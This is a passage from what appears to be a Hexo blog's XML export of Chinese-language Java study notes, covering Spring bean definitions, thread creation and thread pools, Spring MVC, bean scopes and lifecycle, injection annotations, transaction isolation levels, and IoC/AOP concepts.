exposedObject;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h1>9 getMergedBeanDefinition</h1>
<blockquote>
<p>在Spring中用BeanDefinition来代表一个Spring对象的定义。因此有BeanDefinitionBuilder、BeanDefinitionParser这些常见工具类。简单来说，整个Spring容器也就是读取文件、构造BeanDefinition对象、实例化成Bean的过程。BeanDefinition也可以认为是一个Bean元数据的容器，包含了一个bean实例化和初始化所需要的各种参数，比如class、name、scope、properties等等。</p>
</blockquote>
<h1>10 参考：</h1>
<ol>
<li class="lvl-3">
<p><a href="https://bugstack.cn/md/java/interview/2021-04-18-%E9%9D%A2%E7%BB%8F%E6%89%8B%E5%86%8C%20%C2%B7%20%E7%AC%AC30%E7%AF%87%E3%80%8A%E5%85%B3%E4%BA%8E%20Spring%20%E4%B8%AD%20getBean%20%E7%9A%84%E5%85%A8%E6%B5%81%E7%A8%8B%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E3%80%8B.html">面经手册 · 第30篇《关于 Spring 中 getBean 的全流程源码解析》 | 小傅哥 bugstack 虫洞栈</a></p>
</li>
<li class="lvl-4">
<p><a href="https://blog.csdn.net/m0_37607945/article/details/107411096">什么是MergedBeanDefinition?-CSDN博客</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>源码分析</category>
      </categories>
  </entry>
  <entry>
    <title>Java并发(6)：创建线程、线程池</title>
    <url>/2024/05/24/%E6%A1%86%E6%9E%B6/Java%E5%B9%B6%E5%8F%91/Java%E5%B9%B6%E5%8F%91(6)%EF%BC%9A%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
    <content><![CDATA[<h1>1 创建线程方式</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> interfact Runnable&#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-1-实现runnable接口">1.1 实现runnable接口</h2>
<blockquote>
<p>创建一个类实现Runnable接口，实现run方法，然后创建Thread类的实例，将实现了Runnable接口的对象作为参数传递给Thread的构造方法，并调用start方法启动线程。</p>
</blockquote>
<ol>
<li class="lvl-3">
<p>将任务代码移到实现了Runnable接口的类的run方法中（由于Runnable 是一个函数式接口，可以用lambda 表达式建立一个实例）</p>
</li>
<li class="lvl-3">
<p>用<code>Runnable</code>创建一个<code>Thread</code>对象</p>
</li>
<li class="lvl-3">
<p>启动线程</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Runnable r1=<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;任务开始&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Thread t1=<span class="keyword">new</span> <span class="title class_">Thread</span>(r1);</span><br><span class="line">        t1.start();</span><br><span class="line"></span><br><span class="line">        Runnable r2=()-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;lambda表达式：任务开始&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        Thread t2=<span class="keyword">new</span> <span class="title class_">Thread</span>(r2);</span><br><span class="line">        t2.start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Thread t3=<span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;在thread中lambda表达式&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-2-继承Thread类">1.2 继承Thread类</h2>
<blockquote>
<p>创建一个类继承自Thread类，并重写run方法，然后创建该类的实例并调用start方法启动线程。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Thread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;继承Thread类，重写run方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        MyThread myThread=<span class="keyword">new</span> <span class="title class_">MyThread</span>();</span><br><span class="line">        myThread.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-3-实现Callable接口">1.3 实现Callable接口</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Callable</span>&lt;V&gt;&#123;</span><br><span class="line">	V <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>继承Callable实现call方法</p>
</li>
<li class="lvl-2">
<p>FutureTask包装器将Callable转换成Future和Runnable</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CallableDemo</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CallableDemo</span>  <span class="variable">callableDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CallableDemo</span>();</span><br><span class="line">        FutureTask&lt;String&gt; futureTask = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(callableDemo);</span><br><span class="line">        Thread t=<span class="keyword">new</span> <span class="title class_">Thread</span>(futureTask);</span><br><span class="line">        t.start();</span><br><span class="line">        System.out.println(futureTask.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>2 线程池</h1>
<h2 id="2-1-newCachedThreadPool">2.1 <code>newCachedThreadPool</code></h2>
<p>创建一个可缓存的线程池，线程池的大小可根据需要进行自动扩展，但在某些情况下可能会回收线程。</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ExecutorService</span> <span class="variable">executor</span> <span class="operator">=</span> Executors.newCachedThreadPool();</span><br></pre></td></tr></table></figure>
<h2 id="2-2-newFixedThreadPool">2.2 <code>newFixedThreadPool</code></h2>
<p>创建一个固定大小的线程池，线程数始终保持不变。</p>
<h2 id="2-3-newSingleThreadExecutor">2.3 <code>newSingleThreadExecutor</code></h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>创建一个单线程的线程池，保证所有任务按照指定顺序（FIFO，LIFO，优先级）执行。</p>
</li>
</ul>
<h2 id="2-4-newScheduledThreadPool">2.4 <code>newScheduledThreadPool</code></h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>创建一个定时执行任务的线程池。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/01/10/%E6%A1%86%E6%9E%B6/Spring/Spring%EF%BC%9A%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<blockquote>
<p>[!note] 核心特性</p>
<ul class="lvl-1">
<li class="lvl-2">IoC容器：Spring通过控制反转实现了对象的创建和对象间的依赖关系管理。开发者只需要定义好Bean及其依赖关系，Spring容器负责创建和组装这些对象。</li>
<li class="lvl-2">AOP：面向切面编程，允许开发者定义横切关注点，例如事务管理、安全控制等，独立于业务逻辑的代码。通过AOP，可以将这些关注点模块化，提高代码的可维护性和可重用性。</li>
<li class="lvl-2">事务管理：Spring提供了一致的事务管理接口，支持声明式和编程式事务。开发者可以轻松地进行事务管理，而无需关心具体的事务API。</li>
<li class="lvl-2">MVC框架：Spring MVC是一个基于Servlet API构建的Web框架，采用了模型-视图-控制器（MVC）架构。它支持灵活的URL到页面控制器的映射，以及多种视图技术。</li>
</ul>
</blockquote>
<h1>1 Spring、Spring MVC、Spring Boot</h1>
<p>Spring 包含了多个功能模块，其中最重要的是 Spring-Core（主要提供 IoC 依赖注入功能的支持） 模块， Spring 中的其他模块（比如 Spring MVC）的功能实现基本都需要依赖于该模块。</p>
<p>Spring MVC 是 Spring 中的一个很重要的模块，主要赋予 Spring 快速构建 MVC 架构的 Web 程序的能力。MVC 是模型(Model)、视图(View)、控制器(Controller)的简写，其核心思想是通过将业务逻辑、数据、显示分离来组织代码。Spring MVC 下我们一般把后端项目分为 Service 层（处理业务）、Dao 层（数据库操作）、Entity 层（实体类）、Controller 层(控制层，返回数据给前台页面)。</p>
<p>使用 Spring 进行开发各种配置过于麻烦比如开启某些 Spring 特性时，需要用 XML 或 Java 进行显式配置。于是，Spring Boot 诞生了！</p>
<p>Spring 旨在简化 J2EE 企业应用程序开发。Spring Boot 旨在简化 Spring 开发（减少配置文件，开箱即用！）。</p>
<h2 id="1-1-Spring-MVC工作原理">1.1 Spring MVC工作原理</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>DispatcherServlet</code></strong>：<strong>核心的中央处理器</strong>，负责接收请求、分发，并给予客户端响应。</p>
</li>
<li class="lvl-2">
<p><strong><code>HandlerMapping</code></strong>：<strong>处理器映射器</strong>，根据 URL 去匹配查找能处理的 <code>Handler</code> ，并会将请求涉及到的拦截器和 <code>Handler</code> 一起封装。</p>
</li>
<li class="lvl-2">
<p><strong><code>HandlerAdapter</code></strong>：<strong>处理器适配器</strong>，根据 <code>HandlerMapping</code> 找到的 <code>Handler</code> ，适配执行对应的 <code>Handler</code>；</p>
</li>
<li class="lvl-2">
<p><strong><code>Handler</code></strong>：<strong>请求处理器</strong>，处理实际请求的处理器。</p>
</li>
<li class="lvl-2">
<p><strong><code>ViewResolver</code></strong>：<strong>视图解析器</strong>，根据 <code>Handler</code> 返回的逻辑视图 / 视图，解析并渲染真正的视图，并传递给 <code>DispatcherServlet</code> 响应客户端</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408181806265.png" alt="image.png"></p>
<p><strong>流程说明（重要）：</strong></p>
<ol>
<li class="lvl-3">
<p>客户端（浏览器）发送请求， <code>DispatcherServlet</code>拦截请求。</p>
</li>
<li class="lvl-3">
<p><code>DispatcherServlet</code> 根据请求信息调用 <code>HandlerMapping</code> 。<code>HandlerMapping</code> 根据 URL 去匹配查找能处理的 <code>Handler</code>（也就是我们平常说的 <code>Controller</code> 控制器） ，并会将请求涉及到的拦截器和 <code>Handler</code> 一起封装。</p>
</li>
<li class="lvl-3">
<p><code>DispatcherServlet</code> 调用 <code>HandlerAdapter</code>适配器执行 <code>Handler</code> 。</p>
</li>
<li class="lvl-3">
<p><code>Handler</code> 完成对用户请求的处理后，会返回一个 <code>ModelAndView</code> 对象给<code>DispatcherServlet</code>，<code>ModelAndView</code> 顾名思义，包含了数据模型以及相应的视图的信息。<code>Model</code> 是返回的数据对象，<code>View</code> 是个逻辑上的 <code>View</code>。</p>
</li>
<li class="lvl-3">
<p><code>ViewResolver</code> 会根据逻辑 <code>View</code> 查找实际的 <code>View</code>。</p>
</li>
<li class="lvl-3">
<p><code>DispaterServlet</code> 把返回的 <code>Model</code> 传给 <code>View</code>（视图渲染）。</p>
</li>
<li class="lvl-3">
<p>把 <code>View</code> 返回给请求者（浏览器）</p>
</li>
</ol>
<h1>2 Spring Bean</h1>
<p>Bean 代指的就是那些被 IoC 容器所管理的对象。</p>
<h2 id="2-1-Bean作用域">2.1 Bean作用域</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>singleton</strong> : IoC 容器中只有唯一的 bean 实例。Spring 中的 bean 默认都是单例的，是对单例设计模式的应用。</p>
</li>
<li class="lvl-2">
<p><strong>prototype</strong> : 每次获取都会创建一个新的 bean 实例。也就是说，连续 <code>getBean()</code> 两次，得到的是不同的 Bean 实例。</p>
</li>
<li class="lvl-2">
<p><strong>request</strong> （仅 Web 应用可用）: 每一次 HTTP 请求都会产生一个新的 bean（请求 bean），该 bean 仅在当前 HTTP request 内有效。</p>
</li>
<li class="lvl-2">
<p><strong>session</strong> （仅 Web 应用可用） : 每一次来自新 session 的 HTTP 请求都会产生一个新的 bean（会话 bean），该 bean 仅在当前 HTTP session 内有效。</p>
</li>
<li class="lvl-2">
<p><strong>application/global-session</strong> （仅 Web 应用可用）：每个 Web 应用在启动时创建一个 Bean（应用 Bean），该 bean 仅在当前应用启动时间内有效。</p>
</li>
<li class="lvl-2">
<p><strong>websocket</strong> （仅 Web 应用可用）：每一次 WebSocket 会话产生一个新的 bean。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span> <span class="meta">@Scope(value = ConfigurableBeanFactory.SCOPE_PROTOTYPE)</span> <span class="keyword">public</span> Person <span class="title function_">personPrototype</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Person</span>(); &#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2-Bean是否线程安全">2.2 Bean是否线程安全</h2>
<p>prototype 作用域下，每次获取都会创建一个新的 bean 实例，不存在资源竞争问题，所以不存在线程安全问题。singleton 作用域下，IoC 容器中只有唯一的 bean 实例，可能会存在资源竞争问题（取决于 Bean 是否有状态）。如果这个 bean 是有状态的话，那就存在线程安全问题（有状态 Bean 是指包含可变的成员变量的对象）。</p>
<p>大部分 Bean 实际都是无状态（没有定义可变的成员变量）的（比如 Dao、Service），这种情况下， Bean 是线程安全的。</p>
<p>对于有状态单例 Bean 的线程安全问题，常见的有两种解决办法：</p>
<ol>
<li class="lvl-3">
<p>在 Bean 中尽量避免定义可变的成员变量。</p>
</li>
<li class="lvl-3">
<p>在类中定义一个 <code>ThreadLocal</code> 成员变量，将需要的可变成员变量保存在 <code>ThreadLocal</code> 中（推荐的一种方式）。</p>
</li>
</ol>
<h2 id="2-3-Bean生命周期">2.3 Bean生命周期</h2>
<ol>
<li class="lvl-3">
<p><strong>创建 Bean 的实例</strong>：Bean 容器首先会找到配置文件中的 Bean 定义，然后使用 Java 反射 API 来创建 Bean 的实例。</p>
</li>
<li class="lvl-3">
<p><strong>Bean 属性赋值/填充</strong>：为 Bean 设置相关属性和依赖，例如<code>@Autowired</code> 等注解注入的对象、<code>@Value</code> 注入的值、<code>setter</code>方法或构造函数注入依赖和值、<code>@Resource</code>注入的各种资源。</p>
</li>
<li class="lvl-3">
<p><strong>Bean 初始化</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">如果 Bean 实现了 <code>BeanNameAware</code> 接口，调用 <code>setBeanName()</code>方法，传入 Bean 的名字。</li>
<li class="lvl-6">如果 Bean 实现了 <code>BeanClassLoaderAware</code> 接口，调用 <code>setBeanClassLoader()</code>方法，传入 <code>ClassLoader</code>对象的实例。</li>
<li class="lvl-6">如果 Bean 实现了 <code>BeanFactoryAware</code> 接口，调用 <code>setBeanFactory()</code>方法，传入 <code>BeanFactory</code>对象的实例。</li>
<li class="lvl-6">与上面的类似，如果实现了其他 <code>*.Aware</code>接口，就调用相应的方法。</li>
<li class="lvl-6">如果有和加载这个 Bean 的 Spring 容器相关的 <code>BeanPostProcessor</code> 对象，执行<code>postProcessBeforeInitialization()</code> 方法</li>
<li class="lvl-6">如果 Bean 实现了<code>InitializingBean</code>接口，执行<code>afterPropertiesSet()</code>方法。</li>
<li class="lvl-6">如果 Bean 在配置文件中的定义包含 <code>init-method</code> 属性，执行指定的方法。</li>
<li class="lvl-6">如果有和加载这个 Bean 的 Spring 容器相关的 <code>BeanPostProcessor</code> 对象，执行<code>postProcessAfterInitialization()</code> 方法。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>销毁 Bean</strong>：销毁并不是说要立马把 Bean 给销毁掉，而是把 Bean 的销毁方法先记录下来，将来需要销毁 Bean 或者销毁容器的时候，就调用这些方法去释放 Bean 所持有的资源</p>
<ul class="lvl-2">
<li class="lvl-6">如果 Bean 实现了 <code>DisposableBean</code> 接口，执行 <code>destroy()</code> 方法。</li>
<li class="lvl-6">如果 Bean 在配置文件中的定义包含 <code>destroy-method</code> 属性，执行指定的 Bean 销毁方法。或者，也可以直接通过<code>@PreDestroy</code> 注解标记 Bean 销毁之前执行的方法。</li>
</ul>
</li>
</ol>
<blockquote>
<p>[!Note]</p>
<ul class="lvl-1">
<li class="lvl-2"><code>BeanNameAware</code>：注入当前 bean 对应 beanName；</li>
<li class="lvl-2"><code>BeanClassLoaderAware</code>：注入加载当前 bean 的 ClassLoader；</li>
<li class="lvl-2"><code>BeanFactoryAware</code>：注入当前 <code>BeanFactory</code> 容器的引用。</li>
<li class="lvl-2"><code>BeanPostProcessor</code> 接口是 Spring 为修改 Bean 提供的强大扩展点
<ul class="lvl-3">
<li class="lvl-4"><code>postProcessBeforeInitialization</code>：Bean 实例化、属性注入完成后，<code>InitializingBean#afterPropertiesSet</code>方法以及自定义的 <code>init-method</code> 方法之前执行；</li>
<li class="lvl-4"><code>postProcessAfterInitialization</code>：类似于上面，不过是在 <code>InitializingBean#afterPropertiesSet</code>方法以及自定义的 <code>init-method</code> 方法之后执行。</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404031055780.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>整体上可以简单分为四步：实例化 —&gt; 属性赋值 —&gt; 初始化 —&gt; 销毁。</p>
</li>
<li class="lvl-2">
<p>初始化这一步涉及到的步骤比较多，包含 <code>Aware</code> 接口的依赖注入、<code>BeanPostProcessor</code> 在初始化前后的处理以及 <code>InitializingBean</code> 和 <code>init-method</code> 的初始化操作。</p>
</li>
<li class="lvl-2">
<p>销毁这一步会注册相关销毁回调接口，最后通过<code>DisposableBean</code> 和 <code>destory-method</code> 进行销毁。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404031103107.png" alt="image.png"><br>
<a href="https://javaguide.cn/system-design/framework/spring/spring-knowledge-and-questions-summary.html#bean-%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%BA%86%E8%A7%A3%E4%B9%88">Spring常见面试题总结 | JavaGuide</a></p>
<h1>3 注解</h1>
<h2 id="3-1-将一个类声明为Bean的注解">3.1 将一个类声明为Bean的注解</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="meta">@Component</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>@Component</code>：标注一个类为Spring容器的Bean，把普通pojo实例化到spring容器中，相当于配置文件中的&lt;bean id=“” class=“”/&gt;</p>
</li>
<li class="lvl-2">
<p><code>@Repository</code>：对应持久层即Dao层，主要用于数据库相关操作</p>
</li>
<li class="lvl-2">
<p><code>@Service</code>：对应服务层，主要涉及一些复杂的逻辑，需要用到 Dao 层。</p>
</li>
<li class="lvl-2">
<p><code>@Controller</code>：对应 Spring MVC 控制层，主要用于接受用户请求并调用 Service 层返回数据给前端页面。表示Web层实现。</p>
</li>
</ul>
<h3 id="3-1-1-Component-和-Bean-的区别是什么？">3.1.1 @Component 和 @Bean 的区别是什么？</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>@Component</code> 注解作用于类，而<code>@Bean</code>注解作用于方法。</p>
</li>
<li class="lvl-2">
<p><code>@Component</code>通常是通过类路径扫描来自动侦测以及自动装配到 Spring 容器中。<code>@Bean</code> 注解通常是我们在标有该注解的方法中定义产生这个 bean,<code>@Bean</code>告诉了 Spring 这是某个类的实例，当我需要用它的时候还给我。</p>
</li>
</ul>
<h2 id="3-2-注入Bean的注解">3.2 注入Bean的注解</h2>
<p>Spring 内置的 <code>@Autowired</code> 以及 JDK 内置的 <code>@Resource</code> 和 <code>@Inject</code> 都可以用于注入 Bean。</p>
<table>
<thead>
<tr>
<th>Annotation</th>
<th>Package</th>
<th>Source</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>@Autowired</code></td>
<td><code>org.springframework.bean.factory</code></td>
<td>Spring 2.5+</td>
</tr>
<tr>
<td><code>@Resource</code></td>
<td><code>javax.annotation</code></td>
<td>Java JSR-250</td>
</tr>
<tr>
<td><code>@Inject</code></td>
<td><code>javax.inject</code></td>
<td>Java JSR-330</td>
</tr>
</tbody>
</table>
<h3 id="3-2-1-Autowired-和-Resource-的区别是什么？">3.2.1 @Autowired 和 @Resource 的区别是什么？</h3>
<p><code>Autowired</code> 属于 Spring 内置的注解，默认的注入方式为<code>byType</code>（根据类型进行匹配），也就是说会优先根据接口类型去匹配并注入 Bean （接口的实现类）。</p>
<blockquote>
<p>[!note]<br>
<strong>这会有什么问题呢？</strong> 当一个接口存在多个实现类的话，<code>byType</code>这种方式就无法正确注入对象了，因为这个时候 Spring 会同时找到多个满足条件的选择，默认情况下它自己不知道选择哪一个。</p>
<p>这种情况下，注入方式会变为 <code>byName</code>（根据名称进行匹配），这个名称通常就是类名（首字母小写）。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//`SmsService` 接口有两个实现类: `SmsServiceImpl1`和 `SmsServiceImpl2`，且它们都已经被 Spring 容器所管理。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错，byName 和 byType 都无法匹配到 bean</span></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> SmsService smsService;</span><br><span class="line"><span class="comment">// 正确注入 SmsServiceImpl1 对象对应的 bean</span></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> SmsService smsServiceImpl1;</span><br><span class="line"><span class="comment">// 正确注入  SmsServiceImpl1 对象对应的 bean</span></span><br><span class="line"><span class="comment">// smsServiceImpl1 就是我们上面所说的名称</span></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="meta">@Qualifier(value = &quot;smsServiceImpl1&quot;)</span></span><br><span class="line"><span class="keyword">private</span> SmsService smsService;</span><br></pre></td></tr></table></figure>
<p><code>@Resource</code>属于 JDK 提供的注解，默认注入方式为 <code>byName</code>。如果无法通过名称匹配到对应的 Bean 的话，注入方式会变为<code>byType</code>。</p>
<p>如果仅指定 <code>name</code> 属性则注入方式为<code>byName</code>，如果仅指定<code>type</code>属性则注入方式为<code>byType</code>，如果同时指定<code>name</code> 和<code>type</code>属性（不建议这么做）则注入方式为<code>byType</code>+<code>byName</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错，byName 和 byType 都无法匹配到 bean</span></span><br><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> SmsService smsService;</span><br><span class="line"><span class="comment">// 正确注入 SmsServiceImpl1 对象对应的 bean</span></span><br><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> SmsService smsServiceImpl1;</span><br><span class="line"><span class="comment">// 正确注入 SmsServiceImpl1 对象对应的 bean（比较推荐这种方式）</span></span><br><span class="line"><span class="meta">@Resource(name = &quot;smsServiceImpl1&quot;)</span></span><br><span class="line"><span class="keyword">private</span> SmsService smsService;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>[!tip]</p>
<ul class="lvl-1">
<li class="lvl-2"><code>@Autowired</code> 是 Spring 提供的注解，<code>@Resource</code> 是 JDK 提供的注解。</li>
<li class="lvl-2"><code>Autowired</code> 默认的注入方式为<code>byType</code>（根据类型进行匹配），<code>@Resource</code>默认注入方式为 <code>byName</code>（根据名称进行匹配）。</li>
<li class="lvl-2">当一个接口存在多个实现类的情况下，<code>@Autowired</code> 和<code>@Resource</code>都需要通过名称才能正确匹配到对应的 Bean。<code>Autowired</code> 可以通过 <code>@Qualifier</code> 注解来显式指定名称，<code>@Resource</code>可以通过 <code>name</code> 属性来显式指定名称。</li>
<li class="lvl-2"><code>@Autowired</code> 支持在构造函数、方法、字段和参数上使用。<code>@Resource</code> 主要用于字段和方法上的注入，不支持在构造函数或参数上使用。</li>
</ul>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202401101026534.png" alt="image.png"></p>
<h1>4 事务</h1>
<p>在 Spring 框架中， @Transactional注解是用来开启事务的，但它的工作原理是通过代理对象来实现的。 当你在一个 public方法上加上 @Transactional注解时，Spring 会生成一个<mark>代理对象</mark>，该代理对象负责管理事务。 但是，对于 private方法，由于其访问权限的限制，Spring 无法生成代理对象，因此<strong>事务也无法正常生效</strong>。</p>
<h2 id="4-1-事务隔离级别">4.1 事务隔离级别</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>TransactionDefinition.ISOLATION_DEFAULT</code></strong> :使用后端数据库默认的隔离级别</p>
</li>
<li class="lvl-2">
<p><strong><code>TransactionDefinition.ISOLATION_READ_UNCOMMITTED</code></strong> :最低的隔离级别，使用这个隔离级别很少，因为它允许读取尚未提交的数据变更，<strong>可能会导致脏读、幻读或不可重复读</strong></p>
</li>
<li class="lvl-2">
<p><strong><code>TransactionDefinition.ISOLATION_READ_COMMITTED</code></strong> : 允许读取并发事务已经提交的数据，<strong>可以阻止脏读，但是幻读或不可重复读仍有可能发生</strong></p>
</li>
<li class="lvl-2">
<p><strong><code>TransactionDefinition.ISOLATION_REPEATABLE_READ</code></strong> : 对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，<strong>可以阻止脏读和不可重复读，但幻读仍有可能发生。</strong></p>
</li>
<li class="lvl-2">
<p><strong><code>TransactionDefinition.ISOLATION_SERIALIZABLE</code></strong> : 最高的隔离级别，完全服从 ACID 的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，<strong>该级别可以防止脏读、不可重复读以及幻读</strong>。但是这将严重影响程序的性能。通常情况下也不会用到该级别。</p>
</li>
</ul>
<h1>5 BeanFactory</h1>
<blockquote>
<p>生产 bean 的工厂，它负责生产和管理各个 bean 实例。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202401101029274.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ListableBeanFactory：通过这个接口，我们可以获取多个 Bean</p>
</li>
<li class="lvl-2">
<p>HierarchicalBeanFactory：在应用中起多个 BeanFactory，然后可以将各个 BeanFactory 设置为父子关系。</p>
</li>
<li class="lvl-2">
<p>AutowireCapableBeanFactory：自动装配Bean</p>
</li>
<li class="lvl-2">
<p>ConfigurableListableBeanFactory</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Spring：IOC、AOP</title>
    <url>/2024/01/10/%E6%A1%86%E6%9E%B6/Spring/Spring%EF%BC%9AIOC%E3%80%81AOP/</url>
    <content><![CDATA[<p>IoC：即控制反转的意思，它是一种创建和获取对象的技术思想，依赖注入(DI)是实现这种技术的一种方式。传统开发过程中，我们需要通过new关键字来创建对象。使用IoC思想开发方式的话，我们不通过new关键字创建对象，而是通过IoC容器来帮我们实例化对象。 通过IoC的方式，可以大大降低对象之间的耦合度。<br>
AOP：是面向切面编程，能够将那些与业务无关，却为业务模块所共同调用的逻辑封装起来，以减少系统的重复代码，降低模块间的耦合度。<mark>Spring AOP 就是基于动态代理的</mark>，如果要代理的对象，实现了某个接口，那么 Spring AOP 会使用 JDK Proxy，去创建代理对象，而对于没有实现接口的对象，就无法使用 JDK Proxy 去进行代理了，这时候 Spring AOP 会使用 Cglib 生成一个被代理对象的子类来作为代理。</p>
<h1>1 IOC和AOP实现机制</h1>
<h2 id="1-1-IOC实现机制">1.1 IOC实现机制</h2>
<p>反射：Spring IOC容器利用Java的反射机制动态地加载类、创建对象实例及调用对象方法，反射允许在运行时检查类、方法、属性等信息，从而实现灵活的对象实例化和管理。依赖注入：IOC的核心概念是依赖注入，即容器负责管理应用程序组件之间的依赖关系。Spring通过构造函数注入、属性注入或方法注入，将组件之间的依赖关系描述在配置文件中或使用注解。设计模式 - 工厂模式：Spring IOC容器通常采用工厂模式来管理对象的创建和生命周期。容器作为工厂负责实例化Bean并管理它们的生命周期，将Bean的实例化过程交给容器来管理。容器实现：Spring IOC容器是实现IOC的核心，通常使用BeanFactory或ApplicationContext来管理Bean。BeanFactory是IOC容器的基本形式，提供基本的IOC功能；ApplicationContext是BeanFactory的扩展，并提供更多企业级功能。</p>
